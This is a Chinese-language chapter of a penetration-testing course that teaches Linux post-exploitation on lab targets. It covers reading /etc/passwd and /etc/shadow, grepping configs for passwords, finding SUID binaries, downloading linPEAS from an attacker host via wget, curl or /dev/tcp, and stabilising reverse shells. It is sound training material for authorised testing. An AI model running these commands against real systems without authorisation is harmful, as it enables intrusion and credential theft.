# Ch 3 — Linux 滲透必備：指令、檔案系統、權限

> 目標：掌握滲透測試中最常用的 Linux 操作——檔案讀寫、權限、程序管理、網路指令，夠快夠準。

## 為什麼要學這章

你在靶機上拿到 shell 的那一刻，是一個沒有 GUI、可能沒有補全、可能有奇怪限制的環境。你要能快速：

- 找出系統資訊、使用者、網路設定
- 找敏感檔案（密碼、設定檔、flag）
- 理解權限，知道哪些路徑你能寫

## 檔案系統速查

```
/                   根目錄
├── /etc/           系統設定檔（passwd, shadow, hosts, crontab）
├── /var/           變動資料（log, web root, mail）
│   ├── /var/www/   Web 根目錄
│   └── /var/log/   系統日誌
├── /home/          使用者家目錄
├── /tmp/           暫存（任何人可寫，適合放 exploit）
├── /opt/           第三方應用
├── /proc/          程序偽檔案系統（/proc/1/cmdline 看程序指令）
└── /root/          root 的家目錄（通常有 proof.txt）
```

滲透時**最值得看的路徑**：

```bash
cat /etc/passwd        # 所有使用者，找可登入的帳號
cat /etc/shadow        # 密碼 hash（要有 root 或 shadow 群組才能讀）
cat /etc/hosts         # 本地 DNS，找內網機器
ls /home/              # 其他使用者
ls /var/www/html/      # Web 根目錄
find /var/www -name "*.php" -exec grep -l "password\|db_pass" {} \;
```

## 權限系統

```
-rwxr-xr-x 1 root root 12345 Jan 1 00:00 /usr/bin/bash
 ─── ─── ───
  │   │   └── others: r-x（讀＋執行）
  │   └────── group:  r-x
  └────────── owner:  rwx（讀+寫+執行）
```

特殊位元（OSCP 提權常考）：

```
SUID (4xxx)：以擁有者身份執行
  -rwsr-xr-x root root /usr/bin/passwd
  → 任何人執行 passwd 時以 root 身份跑

SGID (2xxx)：以群組身份執行
STICKY (1xxx)：只有擁有者才能刪除（/tmp 通常有）
```

找 SUID binary：

```bash
find / -perm -4000 -type f 2>/dev/null
```

## 程序與網路

```bash
# 看執行中的程序
ps aux
ps aux | grep root     # 找 root 跑的程序

# 看開放的 port（本地）
ss -tlnp               # 推薦
netstat -tlnp          # 老式，有些系統沒有

# 找監聽在 127.0.0.1 的服務（外部掃不到，但本機可打）
ss -tlnp | grep 127

# 看網路介面
ip addr
ip route
```

`ss -tlnp` 的輸出範例：
```
State   Recv-Q  Send-Q  Local Address:Port
LISTEN  0       128     0.0.0.0:22        → SSH 對外開放
LISTEN  0       80      127.0.0.1:3306    → MySQL 只在本機，要從本機打
LISTEN  0       128     0.0.0.0:80        → Web 對外開放
```

本機監聽的服務很重要：如果 80/443 對外開放的應用讓你拿到 shell，但 MySQL 在 127.0.0.1:3306，你可以從 shell 裡直接連。

## 常用操作

### 找檔案

```bash
# 找含有 "password" 的設定檔
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/html/ 2>/dev/null --include="*.php"

# 找最近修改的檔案（排查異常）
find /var/www -mtime -7 -type f

# 找所有可寫的目錄
find / -writable -type d 2>/dev/null | grep -v proc

# 找不在 /dev 的可寫檔案
find / -writable -type f 2>/dev/null | grep -v "proc\|sys\|dev"
```

### 傳檔案到靶機

你拿到 shell 後，經常需要把 exploit 或 linPEAS 傳到靶機上：

```bash
# 在 Kali 啟動 HTTP server
cd ~/tools
python3 -m http.server 80

# 在靶機上下載
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh
curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

# 靶機沒有 wget/curl？試試：
bash -c 'cat < /dev/tcp/10.10.14.5/80' > /tmp/file
```

### 看系統資訊

```bash
uname -a               # 核心版本（找提權 exploit 用）
cat /etc/os-release    # OS 版本
id                     # 自己是誰，哪些群組
whoami
sudo -l                # 自己能用 sudo 跑什麼
env                    # 環境變數（有時有密碼）
```

## Shell 穩定化

你拿到的初始反彈 shell 通常很脆弱：沒有 tab 補全、CTRL+C 會斷線、不能清螢幕。

```bash
# 在靶機 shell 裡執行（Python 升級）
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 然後在靶機 shell 按 CTRL+Z 暫停
# 回到 Kali，執行：
stty raw -echo; fg

# 繼續在靶機 shell：
export TERM=xterm
stty rows 50 columns 200
```

這讓你的 shell 有 tab 補全、方向鍵歷史、CTRL+C 不斷線。**每次拿到 shell 第一件事就是升級它。**

## 使用者切換

```bash
# 切換使用者
su - username          # - 代表切換到該用戶的環境

# 用密碼 SSH（你從設定檔撈到密碼時）
ssh username@10.10.10.x

# 無密碼切換（拿到 SSH key 時）
chmod 600 id_rsa
ssh -i id_rsa username@10.10.10.x
```

## 自我檢核

- [ ] 能列出 `/etc/passwd` 並知道哪些欄位代表什麼
- [ ] 能用 `find` 搜尋 SUID 檔案
- [ ] 能在靶機上用 `python3 -m http.server` + `wget` 傳檔案
- [ ] 會做 shell 穩定化（python3 pty + stty）
- [ ] 知道 `ss -tlnp` 能找到本機監聽服務

→ [Ch 4 網路基礎：TCP/IP、埠口、協定速查](./04-networking-basics.md)
